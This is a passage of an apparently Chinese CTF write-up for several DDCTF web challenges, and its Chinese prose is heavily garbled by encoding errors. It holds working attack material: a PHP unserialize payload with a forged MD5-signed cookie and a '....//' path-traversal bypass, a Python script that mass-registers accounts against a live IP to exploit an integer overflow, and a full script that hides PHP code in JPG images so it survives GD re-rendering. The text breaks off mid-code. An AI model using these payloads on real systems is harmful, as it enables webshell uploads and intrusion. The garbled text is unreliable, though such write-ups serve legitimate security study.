?&gt;Ê≠£ÂàôÁªï‰∫ÜÂçäÂ§©ÔºåÂèëÁé∞Áªï‰∏çËøáÂéªÔºåÊ≠§Êó∂‰∏äÈù¢Êúâ‰∏™Ê≥®Èáä‰∏ÄÁØáÊñáÁ´†ÔºåÂ∫îËØ•ÊòØÊúâÊ†πÊçÆÂá∫Áé∞ÁöÑ„ÄÇËøô‰∏™È¢òÁ°ÆÂÆûÂùëÔºåÂá∫ÁöÑÊ≤°Âï•ÊÑè‰πâÔºåÊúÄÂêéÂèëÁé∞ÂíåËøôÁØáÊñáÁ´†Ê≤°Âï•ÂÖ≥Á≥ªÔºåËøòÊúâ‰∏ÄË°åÊ≥®ÈáäDate: July 4,2018ÔºåÊâæÂà∞Ëøô‰∏ÄÂ§©Êó•ÊúüÁöÑÊñáÁ´†„ÄÇ Êñá‰∏≠Â§öÊ¨°Âúà‰∫Üpractice.txt.swpÊñá‰ª∂ÔºåÊü•ÁúãËøô‰∏™Êñá‰ª∂„ÄÇ ÂæóÂà∞‰∫ÜÊñ∞ÁöÑÊèêÁ§∫ÔºåÊü•ÁúãËøô‰∏™Êñá‰ª∂ÁöÑÊ∫êÁ†ÅÔºå‰ΩÜÊòØ‰∏äÊñáÊ≠£Âàô‰∏çÂÖÅËÆ∏Âá∫Áé∞ÔºÅÔºåÁõ∏Â∫îÁöÑ‰∏ãÈù¢Áªô‰∫ÜÊèêÁ§∫Ôºåconfig‰ºöËá™Âä®ÊõøÊç¢ÊàêÔºÅÔºå f1ag!ddctf.php ÊûÑÈÄ† f1agconfigddctf.phpÂú®ËøõË°å16ËøõÂà∂‰∏§Ê¨°base64ÁºñÁ†ÅÔºåÂæóÂà∞base64ÁöÑÊ∫êÁ†Å‰∏∫Ôºö &lt;?php include(&apos;config.php&apos;); $k = &apos;hello&apos;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&apos;hello&apos;; } } ?&gt;ÂèòÈáèË¶ÜÁõñÊéâÂéüÊù•ÁöÑcontentÔºåÁΩÆ‰∏∫Á©∫ÂæóÂà∞flag„ÄÇ webÁ≠æÂà∞È¢òÁõÆ ÊäìÂåÖÔºåÂèëÁé∞Â≠òÂú®Á¨¨‰∫å‰∏™ÂåÖÔºåÁ¨¨‰∏Ä‰∏™ÊèêÁ§∫Ê≤°ÊúâÊùÉÈôêÔºåÂ∞ùËØïÂ°´ÂÜôadminÁÆ°ÁêÜÂëòÔºåÊàêÂäüËøîÂõûphpÁõÆÂΩïÊèêÁ§∫„ÄÇ ÊâìÂºÄapp//fL2XID2i0Cdh.php Êñá‰ª∂Ëé∑ÂæóÊ∫êÁ†Å„ÄÇ url:app/Application.php Class Application { var $path = &apos;&apos;; public function response($data, $errMsg = &apos;success&apos;) { $ret = [&apos;errMsg&apos; =&gt; $errMsg, &apos;data&apos; =&gt; $data]; $ret = json_encode($ret); header(&apos;Content-type: application/json&apos;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &apos;admin&apos;; if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) { $this-&gt;response(&apos;ÊÇ®ÂΩìÂâçÂΩìÂâçÊùÉÈôê‰∏∫ÁÆ°ÁêÜÂëò----ËØ∑ËÆøÈóÆ:app/fL2XID2i0Cdh.php&apos;); return TRUE; }else{ $this-&gt;response(&apos;Êä±Ê≠âÔºåÊÇ®Ê≤°ÊúâÁôªÈôÜÊùÉÈôêÔºåËØ∑Ëé∑ÂèñÊùÉÈôêÂêéËÆøÈóÆ-----&apos;,&apos;error&apos;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&apos;../&apos;,&apos;&apos;,$path); $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); } exit(); } } url:app/Session.php include &apos;Application.php&apos;; class Session extends Application { //keyÂª∫ËÆÆ‰∏∫8‰ΩçÂ≠óÁ¨¶‰∏≤ var $eancrykey = &apos;&apos;; var $cookie_expiration = 7200; var $cookie_name = &apos;ddctf_id&apos;; var $cookie_path = &apos;&apos;; var $cookie_domain = &apos;&apos;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &apos;DiDI Welcome you %s&apos;; $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]); parent::response($data,&apos;sucess&apos;); }else{ $this-&gt;session_create(); $data = &apos;DiDI Welcome you&apos;; parent::response($data,&apos;sucess&apos;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&apos;../config/key.txt&apos;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) { parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;); return FALSE; } if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) { parent::response(&apos;the user agent not match&apos;,&apos;error&apos;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &apos;&apos;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)), &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;], &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;], &apos;user_data&apos; =&gt; &apos;&apos;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index();ÈÄöËØªphpÊñá‰ª∂ÔºåÂèØ‰ª•ÁúãÂà∞Ëé∑ÂæóflagÁöÑÂÖ≥ÈîÆ‰ª£Á†ÅÂú®Application.phpËØªÂèñÊñá‰ª∂Ëøô‰∏ÄË°åÔºå public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); } exit(); } }ÂèØËßÅÔºåÂè™Ë¶ÅÊéßÂà∂‰∫ÜpathÂ∞±ÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ÔºåÂÖ•ÊâãÁÇπÂú®session.phpÊñá‰ª∂‰∏≠ÔºåÂåÖÂê´‰∫ÜApplication.phpÔºåÊâÄ‰ª•‰ªésession.phpÂÖ•ÊâãÔºåÂèØ‰ª•ÁúãÂà∞Êúâ‰∏ÄË°å $session = unserialize($session);‰ºöÂ∞ÜÊàë‰ª¨ÁöÑsessionÂèçÂ∫èÂàóÂåñÔºåÂ¶ÇÊûúÂú®session‰∏≠Âä†ÂÖ•pathÂèòÈáèÔºåÂèçÂ∫èÂàóÂåñË∞ÉÁî®classÁ±ªÔºåÁÑ∂ÂêéÂà©Áî®ÊûêÊûÑÂáΩÊï∞Êù•ÊâßË°åËØªÂèñÊñá‰ª∂ÁöÑÊìç‰Ωú„ÄÇ Êü•Áúãsession.phpÔºåÂè™Ë¶Åfunction session_read()ËøîÂõûfalseÔºå‰ª£Á†ÅÊÆµÔºåÂ¶ÇÊûúsession_read()ËøîÂõûfalse if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &apos;DiDI Welcome you %s&apos;; $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]); parent::response($data,&apos;sucess&apos;); } else{ $this-&gt;session_create(); $data = &apos;DiDI Welcome you&apos;; parent::response($data,&apos;sucess&apos;); } }Â∞±‰ºöÊâßË°åelse‰∏≠ÁöÑsession_createÔºåÊàë‰ª¨ÊûÑÈÄ†ÁöÑcookie‰∏≠ÁöÑsessionÂ∞±‰ºöË¢´Ë¶ÜÁõñÔºå if(!isset($session)) { parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; }ÈúÄË¶ÅhashÁ≠â‰∫émd5($this-&gt;eancrykey.$session)ÔºåËá™Â∑±ÊûÑÈÄ†ÁöÑËØùÔºåÈ¶ñÂÖàÈúÄË¶ÅÂæóÂà∞eancrykeyÔºåÂæóÂà∞eancryketÁöÑ‰ª£Á†ÅÊÆµ„ÄÇ if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); #eancrykey-&gt;EzblrbNS }Êàë‰ª¨‰º†ÂÖ•postÂèÇÊï∞ÔºåÁÑ∂ÂêéforeachÔºå$VÊõøÊç¢Êéâ%s,‰πüÂ∞±ÊòØÂ¶ÇÊûúËæìÂÖ•nickname=1ÔºåËæìÂá∫Welcome my friend 1Ôºå‰ΩÜÊòØËøôÊ†∑Êó†Ê≥ïËØªÂèñÂà∞eancrykeyÔºåÁ¨¨‰∫åÊ¨°foreachÔºå$dataÂ∞±ÂèòÊàêWelcome my friend 1ÔºåÊó†Ê≥ïËé∑ÂæóeancrykeyÔºå‰ΩÜÊòØÂ¶ÇÊûúÁ¨¨‰∏ÄÊ¨°‰º†ÂÖ•nickname=%s„ÄÇÁ¨¨‰∫åÊ¨°foreachÁöÑdata‰æùÁÑ∂ÊòØWelcome my friend %sÔºåËé∑Âæóeancrykey„ÄÇÊ≠§Êó∂ÈúÄË¶Å‰ΩøÁî®ÊúçÂä°Âô®È•≠ÂõûÊù•ÁöÑsessionÔºå‰∏çÁÑ∂Á¨¨‰∏Ä‰∏™‰ª£Á†ÅÊÆµËøîÂõûfalseÔºåÊó†Ê≥ïÊâßË°å‰∏ãÈù¢ÁöÑ‰ª£Á†Å„ÄÇ if(empty($_COOKIE)) { return FALSE; } Ëé∑Âæóeancrykey‰πãÂêéÂ∞±ÂèØ‰ª•ÁªïËøá$hash !== md5($this-&gt;eancrykey.$session),‰ªéËÄåÊâßË°å $session = unserialize($session); hashÊòØÊàë‰ª¨‰º†ÂÖ•ÁöÑcookieÁöÑÊúÄÂêé32‰ΩçÔºåmd5($this-&gt;eancrykey.$session)ÊòØeancrykeyÂä†Êàë‰ª¨‰º†ÂÖ•ÁöÑÂéªÈô§ÊéâÊúÄÂêé32‰ΩçcookieÔºåÁÑ∂ÂêéÂú®md5ÔºåËøô‰∫õÈÉΩÂèØÊéßÔºåÊûÑÈÄ†‰Ωø‰ªñ‰ª¨Áõ∏Á≠âÔºåÊúÄÂêéÊûÑÈÄ†pocÔºåÂÖ∂‰∏≠‰ª£Á†ÅÊúâ‰∏ÄÂè•Ê≥®ÈáäÂëäËØâÊàë‰ª¨flagÂú®Âì™Èáå„ÄÇ private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&apos;../config/key.txt&apos;); }‰πüÂ∞±ÊòØflagÂú®../config/ÁõÆÂΩï‰∏ãÔºåÂÖ∂‰∏≠../ËøõË°å‰∫ÜËøáÊª§Ôºå../ÊõøÊç¢‰∏∫Á©∫ÔºåÂèåÂÜôÁªïËøáÂç≥ÂèØÔºå‚Ä¶.//ÔºåÂ∞Ü../ÊõøÊç¢‰∏∫Á©∫Ê≠£Â•ΩÊòØ../ ÊûÑÈÄ†poc: O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525#ÈúÄË¶ÅurlÁºñÁ†Å„ÄÇ Â§ßÂêâÂ§ßÂà©,‰ªäÊôöÂêÉÈ∏°~ËøôÈÅìÈ¢òÁõÆËÄÉÁöÑÁõ∏ÂØπÁÆÄÂçïÔºåÂè™Êúâ‰∏Ä‰∏™ÁÇπÔºåÊï¥Êï∞Ê∫¢Âá∫„ÄÇ Âà©Áî®32‰ΩçÁöÑ‰ΩçÈôêÂà∂Ôºå2ÁöÑ32‰Ωç‰∏∫4294967295ÔºåÂè™Ë¶ÅË∂ÖÂá∫Â∞±‰ºöÂèò‰∏∫33‰Ωç‰ªéËÄåÊ∫¢Âá∫Ôºå‰ΩÜÊòØÊúÄÂ§ß32‰ΩçÔºåÊúÄÁªàÈÄ†ÊàêÊ∫¢Âá∫ÔºåÂèØ‰ª•ÂèëÁé∞ÔºåË¥≠‰π∞ÁöÑÊó∂ÂÄôÊàë‰ª¨ÂèØ‰ª•ÊäìÂåÖ‰øÆÊîπ‰ª∑Ê†ºÔºåÂèØ‰ª•ÂæÄÈ´ò‰øÆÊîπÔºå‰ΩÜÊòØÊó†Ê≥ï‰øÆÊîπ‰Ωé‰ª∑Ê†º„ÄÇËÆæÁΩÆ‰ª∑Ê†º‰∏∫4294967296ÔºåÊ≠£Â•ΩÂ§öÂá∫‰∏Ä‰ΩçÔºåÊ∫¢Âá∫„ÄÇ Ê≠§Êó∂‰ª∑Ê†ºÂ∑≤ÁªèÂèëÁîüÊîπÂèòÔºåËôΩÁÑ∂Êï∞ÂÄºÂèòÂ§ß‰∫ÜÔºå‰ΩÜÊòØÁõ¥Êé•ÊîØ‰ªòÊòØÂèØ‰ª•ÊîØ‰ªòÊàêÂäüÁöÑ„ÄÇ Ê≠§Êó∂Â∞±Ê≠£Â∏∏ÁßªÈô§ÂØπÊâãÂ∞±ÂèØ‰ª•ÔºåÁßªÈô§100‰∏™ÂØπÊâãÂæóÂà∞flagÔºåÂÜô‰∏™ËÑöÊú¨ÔºåÊ≥®ÂÜåËé∑Âæóid ticketÔºå‰∏çÊñ≠ÁßªÈô§ÂØπÊâãÂç≥ÂèØ„ÄÇ ‰ΩÜÊòØ‰∏ÄÂºÄÂßãÁßªÈô§Ê≤°ÊúâÈóÆÈ¢òÔºåÂêéÈù¢ÂèëÁé∞ÔºåÂêåIDÂ•ΩÂÉèÂè™ËÉΩÁßªÈô§‰∏ÄÊ¨°ÔºåÊâÄ‰ª•ÂêéÊúüÂøÖÈ°ª‰∏çÊñ≠Â§ßÈáèÊ≥®ÂÜåÔºåÂøÖÈ°ªÂÜôËÑöÊú¨„ÄÇËÄåÁîüÊàêÁöÑIDÂêéÊúü‰ºö‰∏ÄÁõ¥ÈáçÂ§çÔºåÂøÖÈ°ªÂ§ßÈáèÊ≥®ÂÜåÊãºÂáëÂà∞100‰∏™‰∏çÂêåÁöÑID„ÄÇ Êé•‰∏ãÊù•ÊòØËÑöÊú¨„ÄÇË∑ë‰∫ÜÂ•Ω‰∏Ä‰ºöÂø´‰∏Ä‰∏™Â∞èÊó∂„ÄÇ„ÄÇ - -„ÄÇÁΩëÁªú‰∏ç‰Ω≥„ÄÇ import requests import time requests.packages.urllib3.disable_warnings() import re urlsss=&quot;http://117.51.147.155:5050/ctf/api/login?name=saddsadsa545&amp;password=saddsadsa545&quot;#ËøôÈáåÂÜôÈúÄË¶ÅÂêÉÈ∏°ÁöÑË¥¶Âè∑ÊúÄÁªàÊé•ÂèóflagÁöÑË¥¶Âè∑ ss=requests.Session() rr=ss.get(urlsss) for i in range(3500,10000): try: s=requests.Session() register=&quot;http://117.51.147.155:5050//ctf/api/register?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot; url=register%(str(i),str(i)) res=s.get(url) print res.text url=&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297&quot; #login=&quot;http://117.51.147.155:5050/ctf/api/login?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot; #logins=login%(str(i),str(i)) #s=requests.Session() #r=s.get(logins,timeout=3) r=s.get(url) id=&quot;http://117.51.147.155:5050/ctf/api/search_bill_info&quot; r=s.get(id) a=r.text[32:68] pay=&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot; pays=pay%(str(a)) r=s.get(pays) id=r.text[30:34] tick=r.text[48:83] id=id.replace(&quot;:&quot;, &quot;&quot;) id=id.replace(&quot;,&quot;, &quot;&quot;) id=id.replace(&apos;&quot;&apos;, &quot;&quot;) tick=tick.replace(&apos;&quot;&apos;,&quot;&quot;) tick=tick.replace(&apos;}&apos;,&quot;&quot;) tick=tick.replace(&apos;]&apos;,&quot;&quot;) tick=tick.replace(&apos;:&apos;,&quot;&quot;) print id print tick yichu=&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot; result=yichu%(str(id),str(tick)) rr=ss.get(result) print rr.text except Exception as e: pass time.sleep(1) Uoload-IMGËøôÈÅìÈ¢òËÄÉÁÇπÂú®ÂõæÁâá‰∏ä‰º†ÁöÑ‰∫åÊ¨°Ê∏≤ÊüìÔºåÂèÇËÄÉÂÖàÁü•ÁöÑ‰∏ÄÁØáÊñáÁ´†ÔºåÂæàÂÆûÁî® https://xz.aliyun.com/t/2657Âú®‰∏ä‰º†ÂõæÁâáÈ©¨ÁöÑÊó∂ÂÄôÊúâÁßçÊ£ÄÊü•ÊñπÂºèÊòØÂõæÁâáÊ∏≤ÊüìÔºåÂØπ‰∫éÂõæÁâá‰∏ÄÊ¨°Ê∏≤ÊüìÂæàÂÆπÊòìÁªïËøáÔºåÂè™Ë¶Å‰∏çÁ†¥ÂùèÂõæÁâáÁªìÊûÑÂç≥ÂèØÔºåÂç≥ÊèíÂÖ•‰∫Ü‰∏ÄÂè•ËØùÊâìÂºÄÂõæÁâáÔºåÂõæÂÉèÂπ∂‰∏çÂèó‰ªª‰ΩïÂΩ±ÂìçÔºå‰∏ÄËà¨Âú®16ËøõÂà∂‰∏ãÂú®ÊúÄÂêéÂä†‰∏ä‰∏ÄÂè•ËØùÊàñËÄÖÂú®ÂõæÁâá16ËøõÂà∂‰∏≠Èó¥Á©∫ÁôΩÂ§ÑÂä†‰∏äÂç≥ÂèØ„ÄÇ Êú¨È¢òÁî®Âà∞‰∫Ü‰∫åÊ¨°Ê∏≤ÊüìÁü•ËØÜÔºåÂç≥Ôºå‰∏ä‰º†ÂõæÁâá‰πãÂêéÔºåÊúçÂä°Âô®Ë¶ÅÂØπÂõæÁâáÂÅöÁ¨¨‰∫åÊ¨°Ê∏≤ÊüìÔºåÂ∞ÜÁ¨¶ÂêàÂõæÂÉèÁöÑÂÜÖÂÆπÁïô‰∏ãÊù•„ÄÇ‰∏æ‰∏™‰æãÂ≠ê„ÄÇ 16ËøõÂà∂Âä†ÂÖ•phpinfo()‰ª£Á†ÅÁÑ∂ÂêéËøõË°å‰∏ä‰º†„ÄÇ Ê≠§Êó∂ÊúçÂä°Âô®Â∑≤Áªè‰∏ä‰º†‰∏äÂéªÊàë‰ª¨ÁöÑÂõæÁâáÔºå‰∏ãËΩΩ‰∏ãÊù•ÁΩëÁ´ô‰∏äÂ∑≤Áªè‰∏ä‰º†ÊàêÂäüÁöÑÂõæÁâáÔºå ÂèëÁé∞Êàë‰ª¨‰∏ä‰º†ÁöÑÂõæÁâá‰∏≠ÁöÑphpinfo‰∏çËßÅ‰∫ÜÔºåËÄå‰∏îÂõæÁâá‰∏≠Êúâ‰∏™ÁâπÂæÅÔºågdÂ∫ìÊ∏≤ÊüìÔºåËØ¥ÊòéÊòØ‰ΩøÁî®‰∫Ü‰∫åÊ¨°Ê∏≤ÊüìÔºåÊ≠§Êó∂Â∞±ÊòéÁôΩ‰∫ÜËÄÉÁÇπÔºå‰ΩøÁî®‰∫åÊ¨°Ê∏≤ÊüìÁªïËøá„ÄÇ ÂÖàÁü•Á§æÂå∫ÁöÑÊñáÁ´†ËØ¥ÊòéÁöÑÂæàÊ∏ÖÊ•öÂåÖÊã¨jpg,gif,pngÔºåËøôÈáå‰ΩøÁî®jpgÊù•ÁªïËøá‰∏ä‰º†„ÄÇ Êñá‰ª∂jpg_payload.php &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) { die(&apos;php-gd is not installed&apos;); } if(!isset($argv[1])) { die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&apos;Incorrect SOI marker&apos;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) { die(&apos;Success!&apos;); } else { break; } } } } unlink(&apos;payload_&apos;.$argv[1]); die(&apos;Something\&apos;s wrong&apos;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &apos;&apos;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&apos;File not exists [&apos;.$filename.&apos;]&apos;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&apos;End Of File&apos;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&apos;End Of File&apos;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt;1.È¶ñÂÖà‰∏ä‰º†1.jpgÂà∞ctfÂπ≥Âè∞‰∏äÔºåÁÑ∂Âêé‰∏ãËΩΩÁªèËøáÁΩëÁ´ô‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâá,‰øùÂ≠ò‰∏∫1.jpg 2.ÊâßË°åÂëΩ‰ª§ php jpg_payload.php 1.jpg 3.Â∞ÜÁîüÊàêÁöÑpayload_1.jpg‰∏ä‰º†Âç≥ÂèØ„ÄÇ‰πüÂèØ‰ª•Êü•ÁúãÁΩëÁ´ô‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÂèØ‰ª•ÂèëÁé∞Ôºåphpinfo()Âπ∂Ê≤°ÊúâÂõ†‰∫åÊ¨°Ê∏≤ÊüìËÄåÂéªÈô§„ÄÇ homebrew event loop‰∏ÄÈÅìflask pythonÈ¢òÁõÆÔºåÂºÄÂßã‰ª•‰∏∫ÊòØflask session‰º™ÈÄ†„ÄÇÁÑ∂ËÄåÂπ∂‰∏çÊòØ-0-ÔºÅ ÁÇπÂºÄÈ¢òÁõÆÔºåÂÖàÊô∫ËÉΩÁøªËØë‰ª•‰∏ãËã±Êñá„ÄÇ ËøôÈÅìÈ¢òÁõÆÊòØpython flaskÁöÑ‰∏ÄÈÅì‰ª£Á†ÅÂÆ°ËÆ°„ÄÇÁªô‰∫ÜÊ∫ê‰ª£Á†Å,‰∏çÊòØÂæàÁÜüÊÇâ‰ª£Á†ÅÁöÑÊúÄÂ•ΩÂú®Êú¨Âú∞Â§çÁé∞ÁéØÂ¢ÉÔºåÊØîËæÉÂÆπÊòìÁêÜËß£„ÄÇ # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = &apos;garzon&apos; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = &apos;*********************&apos; # censored url_prefix = &apos;/d5af33f66147e857&apos; def FLAG(): return &apos;FLAG_is_here_but_i_wont_show_you&apos; # censored def trigger_event(event): session[&apos;log&apos;].append(event) if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; request.event_queue = request.event_queue[1:] if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == &apos;a&apos; action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;) args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;) try: event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = &apos;&apos; resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos; resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;] session[&apos;points&apos;] = request.prev_session[&apos;points&apos;] break except Exception, e: if resp is None: resp = &apos;&apos; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404) session.modified = True return resp @app.route(url_prefix+&apos;/&apos;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100: querystring = &apos;action:index;False#False&apos; if &apos;num_items&apos; not in session: session[&apos;num_items&apos;] = 0 session[&apos;points&apos;] = 3 session[&apos;log&apos;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = &apos;&apos; html += &apos;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;]) if page == &apos;index&apos;: html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos; html += 